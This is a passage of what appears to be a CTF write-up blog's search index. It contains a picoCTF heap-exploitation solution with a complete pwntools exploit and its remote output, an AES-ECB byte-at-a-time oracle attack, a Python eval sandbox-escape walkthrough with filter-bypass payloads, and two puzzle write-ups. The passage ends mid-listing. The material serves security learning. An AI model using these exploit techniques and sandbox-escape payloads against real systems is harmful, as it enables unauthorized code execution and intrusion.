the flag:\n$ python3 solve.py mercury.picoctf.net 24751 [*] './the_office' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) [*] Testing offset: 0 [+] Opening connection to mercury.picoctf.net on port 24751: Done [*] Computed heap canary: 0xd83ff5c [*] Testing offset: 1 [+] Opening connection to mercury.picoctf.net on port 24751: Done [*] Computed heap canary: 0x4db603e [+] Flag: picoCTF{cb3b0507a278ae12d2465d4c8ee30f31} [*] Closed connection to mercury.picoctf.net port 24751 [*] Closed connection to mercury.picoctf.net port 2475  Alright, we have the flag. But now, let\u0026rsquo;s solve the challenge in another way: leaking the canary.\nWe saw before that we can add employees indicating an email and a building (Bldg) if it applies. Let\u0026rsquo;s restart GDB and add four users (all combinations).\n$ gdb -q the_office Reading symbols from the_office... (No debugging symbols found in the_office) gef➤ run Starting program: ./the_office 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token 1 Name: AAAA Email (y/n)? n Salary: 15 Phone #: BBBB Bldg (y/n)? n 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token 1 Name: CCCC Email (y/n)? n Salary: 127 Phone #: DDDD Bldg (y/n)? y Bldg #: 1 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token 1 Name: EEEE Email (y/n)? y Email address: aaaa Salary: 255 Phone #: FFFF Bldg (y/n)? n 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token 1 Name: GGGG Email (y/n)? y Email address: bbbb Salary: 65535 Phone #: HHHH Bldg (y/n)? y Bldg #: 2 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token ^C Program received signal SIGINT, Interrupt. 0xf7fcf549 in __kernel_vsyscall ()  Now we can check the heap:\ngef➤ grep AAAA [+] Searching 'AAAA' in memory [+] In (0xf7ffb000-0xf7ffc000), permission=rw- 0xf7ffb00c - 0xf7ffb010 → \"AAAA\" gef➤ x/100x 0xf7ffb000 0xf7ffb000: 0x1c180451 0x00000035 0x00000001 0x41414141 0xf7ffb010: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb020: 0x0000000f 0x42424242 0x00000000 0x00000000 0xf7ffb030: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb040: 0x1c180451 0x00000035 0x00000035 0x43434343 0xf7ffb050: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb060: 0x0000007f 0x44444444 0x00000000 0x00000000 0xf7ffb070: 0x00000001 0x00000000 0x00000000 0x00000000 0xf7ffb080: 0x1c180451 0x00000035 0x00000035 0x45454545 0xf7ffb090: 0x00000000 0x00000000 0x00000000 0xf7ffb0cc 0xf7ffb0a0: 0x000000ff 0x46464646 0x00000000 0x00000000 0xf7ffb0b0: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb0c0: 0x1c180451 0x00000015 0x00000035 0x61616161 0xf7ffb0d0: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb0e0: 0x1c180451 0x00000035 0x00000015 0x47474747 0xf7ffb0f0: 0x00000000 0x00000000 0x00000000 0xf7ffb12c 0xf7ffb100: 0x0000ffff 0x48484848 0x00000000 0x00000000 0xf7ffb110: 0x00000002 0x00000000 0x00000000 0x00000000 0xf7ffb120: 0x1c180451 0x00000015 0x00000035 0x62626262 0xf7ffb130: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb140: 0x1c180451 0x00000eb4 0x00000015 0x00000000 0xf7ffb150: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb160: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb170: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb180: 0x00000000 0x00000000 0x00000000 0x00000000  Notice that the email is stored as a pointer to another chunk. If we increase the length of the email field, we are able to obtain a chunk that has the canary at the position where it would be placed the building number in an employee chunk (for instance, between 20 and 35 characters):\n$ gdb -q the_office Reading symbols from the_office... (No debugging symbols found in the_office) gef➤ run Starting program: ./the_office 1) Exit 2) Add employee 3) Remove employee 4) List employees 5) Get access token 1 Name: AAAA Email (y/n)? y Email address: aaaaaaaaaaaaaaaaaaaaaaaa Salary: 255 Phone #: BBBB Bldg (y/n)? n 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token ^C Program received signal SIGINT, Interrupt. 0xf7fcf549 in __kernel_vsyscall ()  This is the heap:\ngef➤ x/40x 0xf7ffb000 0xf7ffb000: 0x73550262 0x00000035 0x00000001 0x41414141 0xf7ffb010: 0x00000000 0x00000000 0x00000000 0xf7ffb04c 0xf7ffb020: 0x000000ff 0x42424242 0x00000000 0x00000000 0xf7ffb030: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb040: 0x73550262 0x00000025 0x00000035 0x61616161 0xf7ffb050: 0x61616161 0x61616161 0x61616161 0x61616161 0xf7ffb060: 0x61616161 0x00000000 0x00000000 0x00000000 0xf7ffb070: 0x73550262 0x00000f84 0x00000025 0x00000000 0xf7ffb080: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb090: 0x00000000 0x00000000 0x00000000 0x00000000  Now the idea is to release the employee and add two new employees, without email:\ngef➤ continue Continuing. 2 Employee #? 0 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token 1 Name: CCCC Email (y/n)? n Salary: 127 Phone #: DDDD Bldg (y/n)? n 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token 3 Employee 0: Name: CCCC Email: Salary: 127 Bldg #: 0 Phone #: DDDD 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token 1 Name: EEEE Email (y/n)? n Salary: 15 Phone #: FFFF Bldg (y/n)? n 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token ^C Program received signal SIGINT, Interrupt. 0xf7fcf549 in __kernel_vsyscall ()  Now, we have overwritten some of the previous values of the heap. As a result, the second user is replacing the email of the first employee:\ngef➤ x/40x 0xf7ffb000 0xf7ffb000: 0x73550262 0x00000035 0x00000001 0x43434343 0xf7ffb010: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb020: 0x0000007f 0x44444444 0x00000000 0x00000000 0xf7ffb030: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb040: 0x73550262 0x00000035 0x00000035 0x45454545 0xf7ffb050: 0x61616100 0x61616161 0x61616161 0x00000000 0xf7ffb060: 0x0000000f 0x46464646 0x00000000 0x00000000 0xf7ffb070: 0x73550262 0x00000f84 0x00000025 0x00000000 0xf7ffb080: 0x73550262 0x00000f74 0x00000035 0x00000000 0xf7ffb090: 0x00000000 0x00000000 0x00000000 0x00000000  And here we see that the second employee contains the canary value at the building (Bldg) position. So we can list all employees and leak the canary:\ngef➤ continue Continuing. 3 Employee 0: Name: CCCC Email: Salary: 127 Bldg #: 0 Phone #: DDDD Employee 1: Name: EEEE Email: Salary: 15 Bldg #: 1934951010 Phone #: FFFF  There we have it:\n$ python3 -c 'print(hex(1934951010))' 0x73550262  What has happened is similar to a Use After Free vulnerability.\nNow the exploitation is the same as before, but instead of computing the canary using a PRNG, we leak it. This is the Python exploit that solves the challenge in this way:\n#!/usr/bin/env python3 from pwn import context, log, p32, process, remote, sys context.binary = 'the_office' elf = context.binary def get_process(): if len(sys.argv) == 1: return elf.process() host, port = sys.argv[1], int(sys.argv[2]) return remote(host, port) def add_employee(p, name=b'a', email=None, salary=b'1', phone=b'b'): p.sendlineafter(b'token', b'1') p.sendlineafter(b'Name: ', name) if email: p.sendlineafter(b'Email (y/n)? ', b'y') p.sendlineafter(b'Email address: ', email) else: p.sendlineafter(b'Email (y/n)? ', b'n') p.sendlineafter(b'Salary: ', salary) p.sendlineafter(b'Phone #: ', phone) p.sendlineafter(b'Bldg (y/n)? ', b'n') def main(): p = get_process() add_employee(p, email=b'A' * 24) p.sendlineafter(b'token', b'2') p.sendlineafter(b'Employee #?\\n', b'0') add_employee(p) add_employee(p) p.sendlineafter(b'token', b'3') p.recvuntil(b'Bldg #: ') p.recvuntil(b'Bldg #: ') canary = int(p.recvline().strip().decode()) log.info(f'Leaked heap canary: {hex(canary)}') p.sendlineafter(b'token', b'2') p.sendlineafter(b'Employee #?\\n', b'0') add_employee(p, phone=b'A' * 28 + p32(canary) + p32(0x35) * 2 + b'admin') p.sendlineafter(b'token', b'4') p.sendlineafter(b'Employee #?\\n', b'1') log.success(f'Flag: {p.recvline().decode()}') p.close() if __name__ == '__main__': main()  It works both locally and remotely:\n$ echo THISISTHEFLAG  flag.txt $ python3 solve2.py [*] './the_office' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) [+] Starting local process './the_office': pid 2081382 [*] Leaked heap canary: 0x5c3b7895 [*] Process './the_office' stopped with exit code 0 (pid 2081382) [+] Flag: THISISTHEFLAG  $ python3 solve2.py mercury.picoctf.net 24751 [*] './the_office' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) [+] Opening connection to mercury.picoctf.net on port 24751: Done [*] Leaked heap canary: 0x29df8536 [+] Flag: picoCTF{cb3b0507a278ae12d2465d4c8ee30f31} [*] Closed connection to mercury.picoctf.net port 24751  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/the-office/","section":"ctf","summary":"picoCTF 2021. 400 points. 32-bit binary. Heap exploitation. Heap overflow. PRNG. Use After Free","time":17,"title":"The Office"},{"contents":"We are given an image with some weird symbols:\nThe name of the challenge is actually a hint, because there is a cipher used by Mary, Queen of Scots. The cipher is based in a substitution of letters by symbols using this alphabet:\nIf we translate every symbol on the given image to a letter, we capture the flag: HTB{THEBABINGTONPLOT}.\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/misc/the-secret-of-a-queen/","section":"ctf","summary":"Queen's cipher","time":1,"title":"The secret of a Queen"},{"contents":"We are given this Python source code:\nfromCrypto.CipherimportAES fromCrypto.Util.Paddingimportpad importrandom importsignal importsubprocess importsocketserver FLAG=b'HTB{--REDACTED--}' prefix=random.randbytes(12) key=random.randbytes(16) defencrypt(key, msg): msg=bytes.fromhex(msg) crypto=AES.new(key, AES.MODE_ECB) padded=pad(prefix+msg+FLAG, 16) returncrypto.encrypt(padded).hex() defchallenge(req): req.sendall(b'Welcome to Klaus\\'s crypto lab.\\n'+ b'It seems like there is a prefix appended to the real firmware\\n'+ b'Can you somehow extract the firmware and fix the chip?\\n') whileTrue: req.sendall(b'\u0026gt; ') try: msg=req.recv(4096).decode() ct=encrypt(key, msg) req.sendall(ct.encode() +b'\\n') exceptExceptionase: print(e) req.sendall(b'An error occurred! Please try again!') classincoming(socketserver.BaseRequestHandler): defhandle(self): signal.alarm(1500) req=self.request challenge(req) classReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass defmain(): socketserver.TCPServer.allow_reuse_address=True server=ReusableTCPServer((\"0.0.0.0\", 1337), incoming) server.serve_forever() if__name__==\"__main__\": main()  Basically, we have the opportunity to send a message that will be encrypted using AES ECB in a particular way:\nFLAG=b'HTB{--REDACTED--}' prefix=random.randbytes(12) key=random.randbytes(16) defencrypt(key, msg): msg=bytes.fromhex(msg) crypto=AES.new(key, AES.MODE_ECB) padded=pad(prefix+msg+FLAG, 16) returncrypto.encrypt(padded).hex()  Our message is surrounded by a 12-bytes random prefix (prefix) and the flag (FLAG) before encryption. The problem here is that it uses AES ECB:\nTherefore, the plaintext is divided in blocks of 16 bytes and then the blocks are encrypted one by one. In order to get the flag, we have an oracle. For instance, we can enter 15 characters A, then a test character and then another 15 characters A. When the output of the two encrypted blocks is the same, we will know that the test character is the first character of the flag.\nLet\u0026rsquo;s show this graphically:\nOur input: \"BBBBAAAAAAAAAAAAAAAxAAAAAAAAAAAAAAA\" Plaintext Blocks: rrrrrrrrrrrrBBBB AAAAAAAAAAAAAAAx AAAAAAAAAAAAAAA? ???????????????? Ciphertext Blocks: R X Y Z  We will iterate over all characters and test them where the x is placed above. We watch the output ciphertext blocks until X = Y; at that point, we will know that the two plaintext blocks are the same, so the tested character is correct.\nThen we must continue as follows:\nOur input: \"BBBBAAAAAAAAAAAAAAHxAAAAAAAAAAAAAA\" Plaintext Blocks: rrrrrrrrrrrrBBBB AAAAAAAAAAAAAAHx AAAAAAAAAAAAAAH? ???????????????? Ciphertext Blocks: R X Y Z  Our input: \"BBBBAAAAAAAAAAAAAHTxAAAAAAAAAAAAA\" Plaintext Blocks: rrrrrrrrrrrrBBBB AAAAAAAAAAAAAHTx AAAAAAAAAAAAAHT? ???????????????? Ciphertext Blocks: R X Y Z  Our input: \"BBBBAAAAAAAAAAAAHTBxAAAAAAAAAAAA\" Plaintext Blocks: rrrrrrrrrrrrBBBB AAAAAAAAAAAAHTBx AAAAAAAAAAAAHTB? ???????????????? Ciphertext Blocks: R X Y Z  Our input: \"BBBBAAAAAAAAAAAHTB{xAAAAAAAAAAA\" Plaintext Blocks: rrrrrrrrrrrrBBBB AAAAAAAAAAAHTB{x AAAAAAAAAAAHTB{? ???????????????? Ciphertext Blocks: R X Y Z  There will be a situation where we cannot enter more junk A characters. Let\u0026rsquo;s assume that the flag is HTB{f4k3_fl4g_f0r_t3st1ng}. This will happen after this iteration:\nOur input: \"BBBBHTB{f4k3_f0r_t3x\" Plaintext Blocks: rrrrrrrrrrrrBBBB HTB{f4k3_f0r_t3x HTB{f4k3_f0r_t3? ???????????????? Ciphertext Blocks: R X Y Z  But it is easy to overcome, we just need to continue shifting the payload:\nOur input: \"BBBBTB{f4k3_f0r_t3sxAAAAAAAAAAAAAAA\" Plaintext Blocks: rrrrrrrrrrrrBBBB TB{f4k3_f0r_t3sx AAAAAAAAAAAAAAAH TB{f4k3_f0r_t3s? ???????????????? Ciphertext Blocks: R X Y Z W  So we will check the output blocks X and Z. And we proceed as follows:\nOur input: \"BBBBB{f4k3_f0r_t3stxAAAAAAAAAAAAAA\" Plaintext Blocks: rrrrrrrrrrrrBBBB B{f4k3_f0r_t3stx AAAAAAAAAAAAAAHT B{f4k3_f0r_t3st? ???????????????? Ciphertext Blocks: R X Y Z W  Our input: \"BBBB{f4k3_f0r_t3st1xAAAAAAAAAAAAA\" Plaintext Blocks: rrrrrrrrrrrrBBBB {f4k3_f0r_t3st1x AAAAAAAAAAAAAHTB {f4k3_f0r_t3st1? ???????????????? Ciphertext Blocks: R X Y Z W  Our input: \"BBBBf4k3_f0r_t3st1nxAAAAAAAAAAAA\" Plaintext Blocks: rrrrrrrrrrrrBBBB f4k3_f0r_t3st1nx AAAAAAAAAAAAHTB{ f4k3_f0r_t3st1n? ???????????????? Ciphertext Blocks: R X Y Z W  Our input: \"BBBB4k3_f0r_t3st1ngxAAAAAAAAAAA\" Plaintext Blocks: rrrrrrrrrrrrBBBB 4k3_f0r_t3st1ngx AAAAAAAAAAAHTB{f 4k3_f0r_t3st1ng? ???????????????? Ciphertext Blocks: R X Y Z W  And the process will end here, because the correct character is }, which terminates the flag. Now, we need to automate this process in Python and interact with the server so that we get the correct characters with the AES ECB oracle and craft the flag:\n$ python3 solve.py 64.227.37.154:30799 [+] Opening connection to 64.227.37.154 on port 30799: Done [◓] Flag: HTB{7h3_br0k3n_0r@c1e!!!} [*] Closed connection to 64.227.37.154 port 30799  The full script can be found in here: solve.py.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/crypto/the-three-eyed-oracle/","section":"ctf","summary":"AES ECB oracle","time":3,"title":"The Three-Eyed Oracle"},{"contents":"In this challenge, we are told to find an email address that was shown in the NASA\u0026rsquo;s website (nasa.gov) on December 31, 1996.\nThe way to find something in a certain date is going to web.archive.org (WayBack Machine):\nHere we search for nasa.gov and get a lot of snapshots of the webpage. Curiously, the oldest snapshot is from December 31, 1996:\nIf we check this snapshot, we see some information. And here we have the email:\nSo, the flag is CTFlearn{today@nasa.gov}.\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/miscellaneous/time-traveller/","section":"ctf","summary":"WayBack Machine","time":1,"title":"Time Traveller"},{"contents":"We are given the Python source code that is being run by the remote instance (util.py):\n#!/usr/bin/env python3.10 importast importmath fromtypingimportUnion defis_expression_safe(node: Union[ast.Expression, ast.AST]) -\u0026gt; bool: matchtype(node): caseast.Constant: returnTrue caseast.List|ast.Tuple|ast.Set: returnis_sequence_safe(node) caseast.Dict: returnis_dict_safe(node) caseast.Name: returnnode.id ==\"math\"andisinstance(node.ctx, ast.Load) caseast.UnaryOp: returnis_expression_safe(node.operand) caseast.BinOp: returnis_expression_safe(node.left) andis_expression_safe(node.right) caseast.Call: returnis_call_safe(node) caseast.Attribute: returnis_expression_safe(node.value) case_: returnFalse defis_sequence_safe(node: Union[ast.List, ast.Tuple, ast.Set]): returnall(map(is_expression_safe, node.elts)) defis_dict_safe(node: ast.Dict) -\u0026gt; bool: fork, vinzip(node.keys, node.values): ifnotis_expression_safe(k) andis_expression_safe(v): returnFalse returnTrue defis_call_safe(node: ast.Call) -\u0026gt; bool: ifnotis_expression_safe(node.func): returnFalse ifnotall(map(is_expression_safe, node.args)): returnFalse ifnode.keywords: returnFalse returnTrue defis_safe(expr: str) -\u0026gt; bool: forbadin['_']: ifbadinexpr: # Just in case! returnFalse returnis_expression_safe(ast.parse(expr, mode='eval').body) if__name__==\"__main__\": print(\"Welcome to SafetyCalc (tm)!\\n\" \"Note: SafetyCorp are not liable for any accidentsthat may occur while using SafetyCalc\") whileTrue: ex=input(\"\u0026gt; \") ifis_safe(ex): try: print(eval(ex, {'math': math, '__builtins__': {}, 'getattr': getattr}, {})) exceptExceptionase: print(f\"Something bad happened! {e}\") else: print(\"Unsafe command detected! The snake approaches...\") exit(-1)  Basically, we have to enter an input (ex) and if it is considered safe (is_safe), it will be passed to eval. However, we only have math module, getattr function and no built-in functions. The objective of this challenge is to somehow execute Python code and read the flag from the file system.\nWe can see what getattr is for:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; help(getattr) Help on built-in function getattr in module builtins: getattr(...) getattr(object, name[, default]) -\u0026gt; value Get a named attribute from an object; getattr(x, 'y') is equivalent to x.y. When a default argument is given, it is returned when the attribute doesn't exist; without it, an exception is raised in that case.  The function is_safe checks if our payload contains underscores (_). If not, then it checks the Abstract Symbol Tree (AST). There are some functions that are involved in the AST validation. In summary:\n Constants are allowed list, tuple and set are allowed as long as their contents are allowed (is_sequence_safe) dict is allowed as long as its keys and values are allowed (is_dict_safe) Functions are safe as long as if belongs to math module  Actually, there is an error on is_dict_safe (yes, the above summary is wrong):\ndefis_dict_safe(node: ast.Dict) -\u0026gt; bool: fork, vinzip(node.keys, node.values): ifnotis_expression_safe(k) andis_expression_safe(v): returnFalse returnTrue  In fact, the dict is safe if the key is safe, no matter the value. Let\u0026rsquo;s test it:\n$ python3 util.py Welcome to SafetyCalc (tm)! Note: SafetyCorp are not liable for any accidents that may occur while using SafetyCalc \u0026gt; getattr() Unsafe command detected! The snake approaches... $ python3 util.py Welcome to SafetyCalc (tm)! Note: SafetyCorp are not liable for any accidents that may occur while using SafetyCalc \u0026gt; {1: getattr()} Something bad happened! getattr expected at least 2 arguments, got 0  Can you spot the differences? We can\u0026rsquo;t execute getattr directly, but as a value of a dict.\nLet\u0026rsquo;s start playing a bit with some payloads. We will use HackTricks to learn a bit of Python sandbox escaping techniques. For example, it is trivial to bypass the underscore check using \\x5f (hexadecimal representation):\n$ python3 util.py Welcome to SafetyCalc (tm)! Note: SafetyCorp are not liable for any accidents that may occur while using SafetyCalc \u0026gt; {1: getattr(math, '\\x5f\\x5fclass\\x5f\\x5f')} {1: \u0026lt;class 'module'\u0026gt;}  We will need to find the some module that can lead to code execution (for example, os). According to HackTricks, we need to enumerate the subclasses of a built-in object using this payload:\n().__class__.__base__.__subclasses__()  But we need to adapt it to our situation:\n$ python3 util.py Welcome to SafetyCalc (tm)! Note: SafetyCorp are not liable for any accidents that may occur while using SafetyCalc \u0026gt; {1: getattr(getattr(getattr((), '\\x5f\\x5fclass\\x5f\\x5f'), '\\x5f\\x5fbase\\x5f\\x5f'), '\\x5f\\x5fsubclasses\\x5f\\x5f')()} {1: [\u0026lt;class 'type'\u0026gt;, \u0026lt;class 'async_generator'\u0026gt;, \u0026lt;class 'int'\u0026gt;, \u0026lt;class 'bytearray_iterator'\u0026gt;, \u0026lt;class 'bytearray'\u0026gt;, \u0026lt;class 'bytes_iterator'\u0026gt;, \u0026lt;class 'bytes'\u0026gt;, \u0026lt;class 'builtin_function_or_method'\u0026gt;, \u0026lt;class 'callable_iterator'\u0026gt;, \u0026lt;class 'PyCapsule'\u0026gt;, \u0026lt;class 'cell'\u0026gt;, \u0026lt;class 'classmethod_descriptor'\u0026gt;, \u0026lt;class 'classmethod'\u0026gt;, \u0026lt;class 'code'\u0026gt;, \u0026lt;class 'complex'\u0026gt;, \u0026lt;class 'coroutine'\u0026gt;, \u0026lt;class 'dict_items'\u0026gt;, \u0026lt;class 'dict_itemiterator'\u0026gt;, \u0026lt;class 'dict_keyiterator'\u0026gt;, \u0026lt;class 'dict_valueiterator'\u0026gt;, \u0026lt;class 'dict_keys'\u0026gt;, \u0026lt;class 'mappingproxy'\u0026gt;, \u0026lt;class 'dict_reverseitemiterator'\u0026gt;, \u0026lt;class 'dict_reversekeyiterator'\u0026gt;, \u0026lt;class 'dict_reversevalueiterator'\u0026gt;, \u0026lt;class 'dict_values'\u0026gt;, \u0026lt;class 'dict'\u0026gt;, \u0026lt;class 'ellipsis'\u0026gt;, \u0026lt;class 'enumerate'\u0026gt;, \u0026lt;class 'float'\u0026gt;, \u0026lt;class 'frame'\u0026gt;, \u0026lt;class 'frozenset'\u0026gt;, \u0026lt;class 'function'\u0026gt;, \u0026lt;class 'generator'\u0026gt;, \u0026lt;class 'getset_descriptor'\u0026gt;, \u0026lt;class 'instancemethod'\u0026gt;, \u0026lt;class 'list_iterator'\u0026gt;, \u0026lt;class 'list_reverseiterator'\u0026gt;, \u0026lt;class 'list'\u0026gt;, \u0026lt;class 'longrange_iterator'\u0026gt;, \u0026lt;class 'member_descriptor'\u0026gt;, \u0026lt;class 'memoryview'\u0026gt;, \u0026lt;class 'method_descriptor'\u0026gt;, \u0026lt;class 'method'\u0026gt;, \u0026lt;class 'moduledef'\u0026gt;, \u0026lt;class 'module'\u0026gt;, \u0026lt;class 'odict_iterator'\u0026gt;, \u0026lt;class 'pickle.PickleBuffer'\u0026gt;, \u0026lt;class 'property'\u0026gt;, \u0026lt;class 'range_iterator'\u0026gt;, \u0026lt;class 'range'\u0026gt;, \u0026lt;class 'reversed'\u0026gt;, \u0026lt;class 'symtable entry'\u0026gt;, \u0026lt;class 'iterator'\u0026gt;, \u0026lt;class 'set_iterator'\u0026gt;, \u0026lt;class 'set'\u0026gt;, \u0026lt;class 'slice'\u0026gt;, \u0026lt;class 'staticmethod'\u0026gt;, \u0026lt;class 'stderrprinter'\u0026gt;, \u0026lt;class 'super'\u0026gt;, \u0026lt;class 'traceback'\u0026gt;, \u0026lt;class 'tuple_iterator'\u0026gt;, \u0026lt;class 'tuple'\u0026gt;, \u0026lt;class 'str_iterator'\u0026gt;, \u0026lt;class 'str'\u0026gt;, \u0026lt;class 'wrapper_descriptor'\u0026gt;, \u0026lt;class 'types.GenericAlias'\u0026gt;, \u0026lt;class 'anext_awaitable'\u0026gt;, \u0026lt;class 'async_generator_asend'\u0026gt;, \u0026lt;class 'async_generator_athrow'\u0026gt;, \u0026lt;class 'async_generator_wrapped_value'\u0026gt;, \u0026lt;class 'coroutine_wrapper'\u0026gt;, \u0026lt;class 'InterpreterID'\u0026gt;, \u0026lt;class 'managedbuffer'\u0026gt;, \u0026lt;class 'method-wrapper'\u0026gt;, \u0026lt;class 'types.SimpleNamespace'\u0026gt;, \u0026lt;class 'NoneType'\u0026gt;, \u0026lt;class 'NotImplementedType'\u0026gt;, \u0026lt;class 'weakref.CallableProxyType'\u0026gt;, \u0026lt;class 'weakref.ProxyType'\u0026gt;, \u0026lt;class 'weakref.ReferenceType'\u0026gt;, \u0026lt;class 'types.UnionType'\u0026gt;, \u0026lt;class 'EncodingMap'\u0026gt;, \u0026lt;class 'fieldnameiterator'\u0026gt;, \u0026lt;class 'formatteriterator'\u0026gt;, \u0026lt;class 'BaseException'\u0026gt;, \u0026lt;class 'hamt'\u0026gt;, \u0026lt;class 'hamt_array_node'\u0026gt;, \u0026lt;class 'hamt_bitmap_node'\u0026gt;, \u0026lt;class 'hamt_collision_node'\u0026gt;, \u0026lt;class 'keys'\u0026gt;, \u0026lt;class 'values'\u0026gt;, \u0026lt;class 'items'\u0026gt;, \u0026lt;class '_contextvars.Context'\u0026gt;, \u0026lt;class '_contextvars.ContextVar'\u0026gt;, \u0026lt;class '_contextvars.Token'\u0026gt;, \u0026lt;class 'Token.MISSING'\u0026gt;, \u0026lt;class 'filter'\u0026gt;, \u0026lt;class 'map'\u0026gt;, \u0026lt;class 'zip'\u0026gt;, \u0026lt;class '_frozen_importlib._ModuleLock'\u0026gt;, \u0026lt;class '_frozen_importlib._DummyModuleLock'\u0026gt;, \u0026lt;class '_frozen_importlib._ModuleLockManager'\u0026gt;, \u0026lt;class '_frozen_importlib.ModuleSpec'\u0026gt;, \u0026lt;class '_frozen_importlib.BuiltinImporter'\u0026gt;, \u0026lt;class '_frozen_importlib.FrozenImporter'\u0026gt;, \u0026lt;class '_frozen_importlib._ImportLockContext'\u0026gt;, \u0026lt;class '_thread.lock'\u0026gt;, \u0026lt;class '_thread.RLock'\u0026gt;, \u0026lt;class '_thread._localdummy'\u0026gt;, \u0026lt;class '_thread._local'\u0026gt;, \u0026lt;class '_io._IOBase'\u0026gt;, \u0026lt;class '_io._BytesIOBuffer'\u0026gt;, \u0026lt;class '_io.IncrementalNewlineDecoder'\u0026gt;, \u0026lt;class 'posix.ScandirIterator'\u0026gt;, \u0026lt;class 'posix.DirEntry'\u0026gt;, \u0026lt;class '_frozen_importlib_external.WindowsRegistryFinder'\u0026gt;, \u0026lt;class '_frozen_importlib_external._LoaderBasics'\u0026gt;, \u0026lt;class '_frozen_importlib_external.FileLoader'\u0026gt;, \u0026lt;class '_frozen_importlib_external._NamespacePath'\u0026gt;, \u0026lt;class '_frozen_importlib_external._NamespaceLoader'\u0026gt;, \u0026lt;class '_frozen_importlib_external.PathFinder'\u0026gt;, \u0026lt;class '_frozen_importlib_external.FileFinder'\u0026gt;, \u0026lt;class 'codecs.Codec'\u0026gt;, \u0026lt;class 'codecs.IncrementalEncoder'\u0026gt;, \u0026lt;class 'codecs.IncrementalDecoder'\u0026gt;, \u0026lt;class 'codecs.StreamReaderWriter'\u0026gt;, \u0026lt;class 'codecs.StreamRecoder'\u0026gt;, \u0026lt;class '_abc._abc_data'\u0026gt;, \u0026lt;class 'abc.ABC'\u0026gt;, \u0026lt;class 'collections.abc.Hashable'\u0026gt;, \u0026lt;class 'collections.abc.Awaitable'\u0026gt;, \u0026lt;class 'collections.abc.AsyncIterable'\u0026gt;, \u0026lt;class 'collections.abc.Iterable'\u0026gt;, \u0026lt;class 'collections.abc.Sized'\u0026gt;, \u0026lt;class 'collections.abc.Container'\u0026gt;, \u0026lt;class 'collections.abc.Callable'\u0026gt;, \u0026lt;class 'os._wrap_close'\u0026gt;, \u0026lt;class '_sitebuiltins.Quitter'\u0026gt;, \u0026lt;class '_sitebuiltins._Printer'\u0026gt;, \u0026lt;class '_sitebuiltins._Helper'\u0026gt;, \u0026lt;class '_distutils_hack._TrivialRe'\u0026gt;, \u0026lt;class '_distutils_hack.DistutilsMetaFinder'\u0026gt;, \u0026lt;class '_distutils_hack.shim'\u0026gt;, \u0026lt;class 'types.DynamicClassAttribute'\u0026gt;, \u0026lt;class 'types._GeneratorWrapper'\u0026gt;, \u0026lt;class 'warnings.WarningMessage'\u0026gt;, \u0026lt;class 'warnings.catch_warnings'\u0026gt;, \u0026lt;class 'importlib._abc.Loader'\u0026gt;, \u0026lt;class 'itertools.accumulate'\u0026gt;, \u0026lt;class 'itertools.combinations'\u0026gt;, \u0026lt;class 'itertools.combinations_with_replacement'\u0026gt;, \u0026lt;class 'itertools.cycle'\u0026gt;, \u0026lt;class 'itertools.dropwhile'\u0026gt;, \u0026lt;class 'itertools.takewhile'\u0026gt;, \u0026lt;class 'itertools.islice'\u0026gt;, \u0026lt;class 'itertools.starmap'\u0026gt;, \u0026lt;class 'itertools.chain'\u0026gt;, \u0026lt;class 'itertools.compress'\u0026gt;, \u0026lt;class 'itertools.filterfalse'\u0026gt;, \u0026lt;class 'itertools.count'\u0026gt;, \u0026lt;class 'itertools.zip_longest'\u0026gt;, \u0026lt;class 'itertools.pairwise'\u0026gt;, \u0026lt;class 'itertools.permutations'\u0026gt;, \u0026lt;class 'itertools.product'\u0026gt;, \u0026lt;class 'itertools.repeat'\u0026gt;, \u0026lt;class 'itertools.groupby'\u0026gt;, \u0026lt;class 'itertools._grouper'\u0026gt;, \u0026lt;class 'itertools._tee'\u0026gt;, \u0026lt;class 'itertools._tee_dataobject'\u0026gt;, \u0026lt;class 'operator.attrgetter'\u0026gt;, \u0026lt;class 'operator.itemgetter'\u0026gt;, \u0026lt;class 'operator.methodcaller'\u0026gt;, \u0026lt;class 'operator.attrgetter'\u0026gt;, \u0026lt;class 'operator.itemgetter'\u0026gt;, \u0026lt;class 'operator.methodcaller'\u0026gt;, \u0026lt;class 'reprlib.Repr'\u0026gt;, \u0026lt;class 'collections.deque'\u0026gt;, \u0026lt;class '_collections._deque_iterator'\u0026gt;, \u0026lt;class '_collections._deque_reverse_iterator'\u0026gt;, \u0026lt;class '_collections._tuplegetter'\u0026gt;, \u0026lt;class 'collections._Link'\u0026gt;, \u0026lt;class 'functools.partial'\u0026gt;, \u0026lt;class 